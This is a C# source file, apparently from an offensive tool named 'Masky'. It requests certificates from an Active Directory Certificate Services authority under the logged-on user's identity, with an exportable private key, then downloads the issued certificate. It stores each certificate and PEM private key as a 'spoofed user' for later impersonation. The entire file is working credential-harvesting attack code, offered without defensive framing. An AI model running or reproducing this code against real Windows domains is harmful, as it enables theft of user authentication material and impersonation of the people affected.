using System.Security.Principal;
using System.DirectoryServices.AccountManagement;
using System.Security.Cryptography;
using CERTENROLLLib;
using CERTCLILib;
using System.IO;
using Newtonsoft.Json;
using System.Collections.Generic;
using System;
using System.Threading;

namespace Masky
{

    public class SpoofedUser
    {
        public string Hostname { get; set; }
        public string Username { get; set; }
        public string Cert { get; set; }
        public string PrivateKey { get; set; }

        public SpoofedUser(string Hostname, string Username, string Cert, string PrivateKey)
        {
            this.Hostname = Hostname;
            this.Username = Username;
            this.Cert = Cert;
            this.PrivateKey = PrivateKey;
        }
    }
    public class Cert
    {
        private string CA = null;
        private string templateName = null;
        public List<SpoofedUser> spoofedUsers = new List<SpoofedUser>();

        public Cert(string CA, string templateName)
        {
            this.CA = CA;
            this.templateName = templateName;
        }
        public enum Encoding
        {
            CR_IN_BASE64HEADER = 0x0,
            CR_IN_BASE64 = 0x1,
            CR_IN_BINARY = 0x2,
            CR_IN_ENCODEANY = 0xff,
            CR_OUT_BASE64HEADER = 0x0,
            CR_OUT_BASE64 = 0x1,
            CR_OUT_BINARY = 0x2
        }

        public enum Format
        {
            CR_IN_FORMATANY = 0x0,
            CR_IN_PKCS10 = 0x100,
            CR_IN_KEYGEN = 0x200,
            CR_IN_PKCS7 = 0x300,
            CR_IN_CMC = 0x400
        }

        public enum RequestDisposition
        {
            CR_DISP_INCOMPLETE = 0,
            CR_DISP_ERROR = 0x1,
            CR_DISP_DENIED = 0x2,
            CR_DISP_ISSUED = 0x3,
            CR_DISP_ISSUED_OUT_OF_BAND = 0x4,
            CR_DISP_UNDER_SUBMISSION = 0x5,
            CR_DISP_REVOKED = 0x6,
            CCP_DISP_INVALID_SERIALNBR = 0x7,
            CCP_DISP_CONFIG = 0x8,
            CCP_DISP_DB_FAILED = 0x9
        }

        class CertificateRequest
        {
            public CertificateRequest(string request, string privateKeyPem)
            {
                Request = request;
                PrivateKeyPem = privateKeyPem;
            }

            public string Request { get; set; }
            public string PrivateKeyPem { get; set; }

        }

        private static void EncodeIntegerBigEndian(BinaryWriter stream, byte[] value, bool forceUnsigned = true)
        {
            stream.Write((byte)0x02);
            var prefixZeros = 0;
            for (var i = 0; i < value.Length; i++)
            {
                if (value[i] != 0) break;
                prefixZeros++;
            }
            if (value.Length - prefixZeros == 0)
            {
                EncodeLength(stream, 1);
                stream.Write((byte)0);
            }
            else
            {
                if (forceUnsigned && value[prefixZeros] > 0x7f)
                {
                    EncodeLength(stream, value.Length - prefixZeros + 1);
                    stream.Write((byte)0);
                }
                else
                {
                    EncodeLength(stream, value.Length - prefixZeros);
                }
                for (var i = prefixZeros; i < value.Length; i++)
                {
                    stream.Write(value[i]);
                }
            }
        }


        private static void EncodeLength(BinaryWriter stream, int length)
        {
            if (length < 0) throw new ArgumentOutOfRangeException("length", "Length must be non-negative");
            if (length < 0x80)
            {
                // Short form
                stream.Write((byte)length);
            }
            else
            {
                // Long form
                var temp = length;
                var bytesRequired = 0;
                while (temp > 0)
                {
                    temp >>= 8;
                    bytesRequired++;
                }
                stream.Write((byte)(bytesRequired | 0x80));
                for (var i = bytesRequired - 1; i >= 0; i--)
                {
                    stream.Write((byte)(length >> (8 * i) & 0xff));
                }
            }
        }

        private static IX509PrivateKey CreatePrivateKey(bool machineContext)
        {
            var cspInfo = new CCspInformations();
            cspInfo.AddAvailableCsps();

            var privateKey = (IX509PrivateKey)Activator.CreateInstance(Type.GetTypeFromProgID("X509Enrollment.CX509PrivateKey"));

            privateKey.Length = 2048;
            privateKey.KeySpec = X509KeySpec.XCN_AT_SIGNATURE;
            privateKey.KeyUsage = X509PrivateKeyUsageFlags.XCN_NCRYPT_ALLOW_ALL_USAGES;
            privateKey.MachineContext = machineContext;
            privateKey.ExportPolicy = X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_EXPORT_FLAG;
            privateKey.CspInformations = cspInfo;

            privateKey.Create();

            return privateKey;
        }

        public static string ConvertToPEM(string privKeyStr)
        {
            var rsa = new RSACryptoServiceProvider();
            var CryptoKey = Convert.FromBase64String(privKeyStr);
            rsa.ImportCspBlob(CryptoKey);

            return ExportPrivateKey(rsa);
        }

        private static string GetCurrentUserDN()
        {
            return UserPrincipal.Current.DistinguishedName.Replace(",", ", ");
        }



        private CertificateRequest CreateCertRequestMessage()
        {
            string subjectName = "";

            try
            {
                subjectName = GetCurrentUserDN();
            }
            catch { }

            var privateKey = CreatePrivateKey(false);
            var privateKeyBase64 = privateKey.Export("PRIVATEBLOB", EncodingType.XCN_CRYPT_STRING_BASE64);
            var privateKeyPEM = ConvertToPEM(privateKeyBase64);

            IX509CertificateRequestPkcs10V3 objPkcs10 = (IX509CertificateRequestPkcs10V3)Activator.CreateInstance(Type.GetTypeFromProgID("X509Enrollment.CX509CertificateRequestPkcs10"));
            var context = X509CertificateEnrollmentContext.ContextUser;

            objPkcs10.InitializeFromPrivateKey(context, privateKey, "");

            CX509ExtensionTemplateName objExtensionTemplate = new CX509ExtensionTemplateName();
            objExtensionTemplate.InitializeEncode(this.templateName);
            objPkcs10.X509Extensions.Add((CX509Extension)objExtensionTemplate);

            var objDN = new CX500DistinguishedName();

            try
            {
                objDN.Encode(subjectName, X500NameFlags.XCN_CERT_NAME_STR_NONE);
            }
            catch
            {
                objDN.Encode(subjectName, X500NameFlags.XCN_CERT_NAME_STR_SEMICOLON_FLAG);
            }

            objPkcs10.Subject = objDN;

            var objEnroll = new CX509Enrollment();
            objEnroll.InitializeFromRequest(objPkcs10);
            var base64request = objEnroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);

            return new CertificateRequest(base64request, privateKeyPEM);
        }

        private static string ExportPrivateKey(RSACryptoServiceProvider csp)
        {
            if (csp.PublicOnly) throw new ArgumentException("CSP does not contain a private key", "csp");
            TextWriter outputStream = new StringWriter();

            var parameters = csp.ExportParameters(true);

            var stream = new MemoryStream();
            var writer = new BinaryWriter(stream);
            writer.Write((byte)0x30);
            using (var innerStream = new MemoryStream())
            {
                var innerWriter = new BinaryWriter(innerStream);
                EncodeIntegerBigEndian(innerWriter, new byte[] { 0x00 });
                EncodeIntegerBigEndian(innerWriter, parameters.Modulus);
                EncodeIntegerBigEndian(innerWriter, parameters.Exponent);
                EncodeIntegerBigEndian(innerWriter, parameters.D);
                EncodeIntegerBigEndian(innerWriter, parameters.P);
                EncodeIntegerBigEndian(innerWriter, parameters.Q);
                EncodeIntegerBigEndian(innerWriter, parameters.DP);
                EncodeIntegerBigEndian(innerWriter, parameters.DQ);
                EncodeIntegerBigEndian(innerWriter, parameters.InverseQ);
                var length = (int)innerStream.Length;
                EncodeLength(writer, length);
                writer.Write(innerStream.GetBuffer(), 0, length);
            }

            var base64 = Convert.ToBase64String(stream.GetBuffer(), 0, (int)stream.Length).ToCharArray();
            outputStream.WriteLine("-----BEGIN RSA PRIVATE KEY-----");

            for (var i = 0; i < base64.Length; i += 64)
            {
                outputStream.WriteLine(base64, i, Math.Min(64, base64.Length - i));
            }
            outputStream.WriteLine("-----END RSA PRIVATE KEY-----");

            return outputStream.ToString();
        }

        public static int SendCertificateRequest(string CA, string message)
        {
            var objCertRequest = new CCertRequest();
            var iDisposition = objCertRequest.Submit(
                    (int)Encoding.CR_IN_BASE64 | (int)Format.CR_IN_FORMATANY,
                    message,
                    string.Empty,
                    CA);
            return objCertRequest.GetRequestId();
        }

        public static string DownloadCert(string CA, int requestId)
        {
            TextWriter s = new StringWriter();

            var objCertRequest = new CCertRequest();
            var iDisposition = objCertRequest.RetrievePending(requestId, CA);

            if (iDisposition == (int)RequestDisposition.CR_DISP_ISSUED)
            {
                var cert = objCertRequest.GetCertificate((int)Encoding.CR_OUT_BASE64);

                s.WriteLine("-----BEGIN CERTIFICATE-----");
                s.Write(cert);
                s.WriteLine("-----END CERTIFICATE-----");
            }
            return s.ToString();
        }

        public void GetCertUser()
        {
            string UserName = WindowsIdentity.GetCurrent().Name;
            string Hostname = System.Net.Dns.GetHostName();
            var csr = CreateCertRequestMessage();

            int requestID;

            requestID = SendCertificateRequest(this.CA, csr.Request);
            Thread.Sleep(5000);


            var certPemString = DownloadCert(CA, requestID);

            if (certPemString != "")
            {
                spoofedUsers.Add(new SpoofedUser(Hostname, UserName, certPemString, csr.PrivateKeyPem));
                Console.WriteLine("[+] Gathered certificate related to: '{0}'", UserName);
            }
            else if (certPemString == "" && csr.PrivateKeyPem != "")
            {
                Console.Error.WriteLine("Empty Certificate for the user '{0}'", UserName);
            }
            return;
        }
    }
}